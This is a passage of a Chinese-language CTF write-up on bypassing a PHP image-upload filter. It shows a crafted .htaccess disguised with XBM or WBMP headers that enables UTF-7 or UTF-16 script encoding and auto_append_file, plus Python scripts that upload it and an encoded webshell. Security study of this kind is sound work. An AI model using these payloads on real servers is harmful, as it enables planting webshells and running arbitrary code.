LlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190827155221.png" alt=""></p><p>将 width &amp; height 改成需要的数值，这样我们就可以上传<code>.htaccess</code>了</p><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>既然可以上传了<code>.htaccess</code>，那接下来就是到传 webshell 了。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$image = file_get_contents($tmp_name);</span><br><span class="line"><span class="hljs-keyword">if</span> (mb_strpos($image, <span class="hljs-string">"&lt;?"</span>) !== <span class="hljs-keyword">FALSE</span>) {</span><br><span class="line">  <span class="hljs-keyword">die</span>(<span class="hljs-string">"why would you need php in a pic....."</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>主要就是对<code>&lt;?</code>的绕过了，这里我们可以使用<code>htaccess</code>的另外一些技巧来进行绕过，我们可以在 <a href="https://www.php.net/manual/en/configuration.changes.php" target="_blank" rel="noopener">How to change configuration settings</a> 这里查找到 php 关于<code>.htaccess</code>的处理文档。</p><p>并且我们可以看到有一个比较有意思的选项：</p><blockquote><p>​    zend.multibyte boolean</p><p>Enables parsing of source files in multibyte encodings. Enabling zend.multibyte is required to use character encodings like SJIS, BIG5, etc that contain special characters in multibyte string data. ISO-8859-1 compatible encodings like UTF-8, EUC, etc do not require this option.</p><p>Enabling zend.multibyte requires the mbstring extension to be available.</p></blockquote><p>以及</p><blockquote><p>​    zend.script_encoding string</p><p>This value will be used unless a <a href="https://www.php.net/manual/en/control-structures.declare.php#control-structures.declare.encoding" target="_blank" rel="noopener">declare(encoding=…)</a> directive appears at the top of the script. When ISO-8859-1 incompatible encoding is used, both zend.multibyte and zend.script_encoding must be used.</p><p>Literal strings will be transliterated from zend.script_enconding to mbstring.internal_encoding, as if<a href="https://www.php.net/manual/en/function.mb-convert-encoding.php" target="_blank" rel="noopener">mb_convert_encoding()</a> would have been called.</p></blockquote><p>并且我们在 <a href="https://www.php.net/manual/en/mbstring.supported-encodings.php" target="_blank" rel="noopener">Supported Character Encodings</a> 可以找到 php 支持的编码方式，根据这两个选项我们就可以利用编码的形式来编码我们的文件内容，然后利用<code>.htaccess</code>的设置来进行解码执行。</p><p>所以这里我们可以使用 UTF-7 编码来进行编码内容，并且使用<code>auto_append_file</code>把<code>.htaccess</code>的内容在执行时追加入到当前目录的文件中，例如在<code>.htaccess</code>中我们可以这么这么写</p><p></p><figure class="highlight properties hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#define test_width 1337</span></span><br><span class="line"><span class="hljs-comment">#define test_height 1337</span></span><br><span class="line"><span class="hljs-attr">AddType</span> <span class="hljs-string">application/x-httpd-php .xbm</span></span><br><span class="line"><span class="hljs-attr">php_flag</span> <span class="hljs-string">zend.multibyte 1</span></span><br><span class="line"><span class="hljs-attr">php_value</span> <span class="hljs-string">zend.script_encoding "UTF-7"</span></span><br><span class="line"><span class="hljs-attr">php_value</span> <span class="hljs-string">auto_append_file .htaccess</span></span><br><span class="line"><span class="hljs-comment">#+ADw?php phpinfo()+ADs</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>然后再上传一个宽度高度符合要求的 xbm 文件即可。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190828023441.png" alt=""></p><p>当然也可以使用其他编码啦，比如 utf-16，一种大端编码的方式，一个字符由两个字节编码，我们可以这么构造：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190830022019.png" alt=""></p><p>exp.php 中的内容就是你想上传的 php 代码</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">VALID_XBM = <span class="hljs-string">b"""#define width 1337</span></span><br><span class="line"><span class="hljs-string">#define height 1337"""</span></span><br><span class="line"></span><br><span class="line">URL = <span class="hljs-string">"http://your_url/upload/?"</span></span><br><span class="line">RANDOM_DIRECTORY = <span class="hljs-string">"674b2fcf215d9e16619a0ad3648e704ee50377e5"</span></span><br><span class="line"></span><br><span class="line">COOKIES = {</span><br><span class="line">    <span class="hljs-string">"PHPSESSID"</span> : <span class="hljs-string">"fsppftvh6q5kpf8e0b7e9p2le5"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_content</span><span class="hljs-params">(name, content)</span>:</span></span><br><span class="line"></span><br><span class="line">    data = {</span><br><span class="line">        <span class="hljs-string">"image"</span> : (name, content, <span class="hljs-string">'image/png'</span>),</span><br><span class="line">        <span class="hljs-string">"upload"</span> : (<span class="hljs-literal">None</span>, <span class="hljs-string">"Submit Query"</span>, <span class="hljs-literal">None</span>)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> requests.post(URL, files=data, cookies=COOKIES)</span><br><span class="line"></span><br><span class="line">HT_ACCESS = VALID_XBM + <span class="hljs-string">b"""</span></span><br><span class="line"><span class="hljs-string">AddType application/x-httpd-php .zedd</span></span><br><span class="line"><span class="hljs-string">php_value zend.multibyte 1</span></span><br><span class="line"><span class="hljs-string">php_value zend.detect_unicode 1</span></span><br><span class="line"><span class="hljs-string">php_value display_errors 1</span></span><br><span class="line"><span class="hljs-string">"""</span></span><br><span class="line">TARGET_FILE = VALID_XBM + open(<span class="hljs-string">"exp.php"</span>, <span class="hljs-string">'r'</span>).read().encode(<span class="hljs-string">'utf-16'</span>)</span><br><span class="line"></span><br><span class="line">upload_content(<span class="hljs-string">"..htaccess"</span>, HT_ACCESS)</span><br><span class="line">upload_content(<span class="hljs-string">"source.zedd"</span>, TARGET_FILE)</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="WBMP"><a href="#WBMP" class="headerlink" title="WBMP"></a>WBMP</h2><h3 id="htaccess-1"><a href="#htaccess-1" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>除了 XBM 文件，当然还有其他文件可以利用啦。例如 wbmp 格式的图片文件。</p><p>因为在<code>.htaccess</code> 中<code>0x00</code>开头的一行会与<code>#</code>一样被当作注释处理，然后我们也可以发现标准的 xbm 格式：</p><p></p><figure class="highlight shell hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash">xxd test3.wbmp | head</span></span><br><span class="line">00000000: 0000 8930 8620 0000 0000 0000 0000 0000  ...0. ..........</span><br><span class="line">00000010: 0000 0000 0000 0000 0012 4908 0002 0081  ..........I.....</span><br><span class="line">00000020: 0440 0000 0000 0000 0000 0000 2400 0009  .@..........$...</span><br><span class="line">00000030: 2092 4800 0000 0000 0000 0000 1248 4012   .H..........H@.</span><br><span class="line">00000040: 4000 0040 2224 954a a4aa 9224 8900 8410  @..@"$.J...$....</span><br><span class="line">00000050: 0012 52a8 8889 2494 94a5 5540 0000 1000  ..R...$...U@....</span><br><span class="line">00000060: 0000 5480 0200 0928 0000 0000 0000 002a  ..T....(.......*</span><br><span class="line">00000070: 9248 0001 2555 2490 0000 0000 0000 0000  .H..%U$.........</span><br><span class="line">00000080: 0000 0000 0000 0000 1124 a555 5555 5555  .........$.UUUUU</span><br><span class="line">00000090: 52aa 4a55 5555 5555 4aaa a8aa 0000 0000  R.JUUUUUJ.......</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以发现这个的开头其实就是<code>0x00</code>，所以接下来我们只需要更改图片的 width &amp; height 就可以了，但是貌似并没有一个标准的文件格式供我们参考，于是我们可以单独一位一位地去尝试，这样我们就可以得到一个最小的基本没有冗余数据的 wbmp 文件了。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line"></span><br><span class="line">$contents = file_get_contents(<span class="hljs-string">"test3.wbmp"</span>);</span><br><span class="line">$i = <span class="hljs-number">0</span>;</span><br><span class="line"><span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) {</span><br><span class="line">    $truncated = substr($contents, <span class="hljs-number">0</span>, $i);</span><br><span class="line">    file_put_contents(<span class="hljs-string">"truncated.wbmp"</span>, $truncated);</span><br><span class="line">    <span class="hljs-keyword">if</span> (exif_imagetype(<span class="hljs-string">"truncated.wbmp"</span>)) <span class="hljs-keyword">break</span>;</span><br><span class="line">    $i += <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"Shortest file size : $i\n"</span>;</span><br><span class="line"></span><br><span class="line">var_dump(exif_imagetype(<span class="hljs-string">"truncated.wbmp"</span>));</span><br><span class="line">var_dump(getimagesize(<span class="hljs-string">"truncated.wbmp"</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后我们可以根据 <a href="https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format" target="_blank" rel="noopener">Wireless Application Protocol Bitmap Format</a> ，可以看出大致的文件构造：</p><table><thead><tr><th align="center">Field name</th><th align="center">Field type</th><th align="center">Size (in bytes)</th><th align="center">Purpose</th></tr></thead><tbody><tr><td align="center">Type</td><td align="center"><a href="https://en.wikipedia.org/wiki/Variable_length_unsigned_integer" target="_blank" rel="noopener">uintvar</a></td><td align="center">variable</td><td align="center">Type of the image, and is 0 for monochrome bitmaps.</td></tr><tr><td align="center">Fixed header</td><td align="center"><a href="https://en.wikipedia.org/wiki/Byte" target="_blank" rel="noopener">byte</a></td><td align="center">1</td><td align="center">Reserved. Always 0.</td></tr><tr><td align="center">Width</td><td align="center"><a href="https://en.wikipedia.org/wiki/Variable_length_unsigned_integer" target="_blank" rel="noopener">uintvar</a></td><td align="center">variable</td><td align="center">Width of the image in pixels.</td></tr><tr><td align="center">Height</td><td align="center"><a href="https://en.wikipedia.org/wiki/Variable_length_unsigned_integer" target="_blank" rel="noopener">uintvar</a></td><td align="center">variable</td><td align="center">Height of the image in pixels.</td></tr><tr><td align="center">Data</td><td align="center">byte array</td><td align="center">variable</td><td align="center">Data bytes arranged in rows – one bit per pixel. A black pixel is denoted by 0 and a white pixel is denoted by 1. Where the row length is not divisible by 8, the row is 0-padded to the byte boundary.</td></tr></tbody></table><p>还有这个 wbmp 的宽度高度格式有点奇怪，第三位是以 128 为基数算的，所以这里只能凑一下得到 1337 的高与宽</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190828165647.png" alt=""></p><p>这里需要注意一下有个坑，直接提交的话还不知什么原因会自动加上<code>0xefbf</code>污染了原数据，所以这里需要手动写脚本交一下。</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">VALID_WBMP = <span class="hljs-string">b"\x00\x00\x8a\x39\x8a\x39\x0a"</span></span><br><span class="line">URL = <span class="hljs-string">"http://your_url/upload/?"</span></span><br><span class="line">RANDOM_DIRECTORY = <span class="hljs-string">"674b2fcf215d9e16619a0ad3648e704ee50377e5"</span></span><br><span class="line"></span><br><span class="line">COOKIES = {</span><br><span class="line">    <span class="hljs-string">"PHPSESSID"</span> : <span class="hljs-string">"kivnml45mpi9ohknv2i8s8ecoj"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_content</span><span class="hljs-params">(name, content)</span>:</span></span><br><span class="line"></span><br><span class="line">    data = {</span><br><span class="line">        <span class="hljs-string">"image"</span> : (name, content, <span class="hljs-string">'image/png'</span>),</span><br><span class="line">        <span class="hljs-string">"upload"</span> : (<span class="hljs-literal">None</span>, <span class="hljs-string">"Submit Query"</span>, <span class="hljs-literal">None</span>)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    response = requests.post(URL, files=data, cookies=COOKIES)</span><br><span class="line"></span><br><span class="line">HT_ACCESS = VALID_WBMP + <span class="hljs-string">b"""</span></span><br><span class="line"><span class="hljs-string">AddType application/x-httpd-php .zedd</span></span><br><span class="line"><span class="hljs-string">"""</span></span><br><span class="line"></span><br><span class="line">upload_content(<span class="hljs-string">"..htaccess"</span>, HT_ACCESS)</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="webshell-1"><a href="#webshell-1" class="headerlink" title="webshell"></a>webshell</h3><p>既然能传<code>.htaccess</code>了，当然我们也可以用上面提到的 UTF-7 编码绕过，但是这里我们可以换另一种形式，比如 base64。</p><blockquote><p>​    auto_append_file  string</p><p>Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the <a href="https://www.php.net/manual/en/function.require.php" target="_blank" rel="noopener">require</a> function, so <a href="https://www.php.net/manual/en/ini.core.php#ini.include-path" target="_blank" rel="noopener">include_path</a> is used.</p><p>The special value <em>none</em> disables auto-appending.</p></blockquote><p>让我们仔细看看这个定义，这个功能就相当于使用了<code>require</code>方法，所以我们当然也可以使用<code>php://filter</code>啦，比如我们最常用的文件包含<code>php://filter/read=convert.base64-decode/resource=</code></p><p>所以我们可以先传一个用 WBMP 格式头伪装的文件，文件中有经过 base64 编码过后的 php 代码，然后经过<code>.htaccess</code>的作用，我们就可以执行任意 php 代码了，但是这里需要注意的是，base64 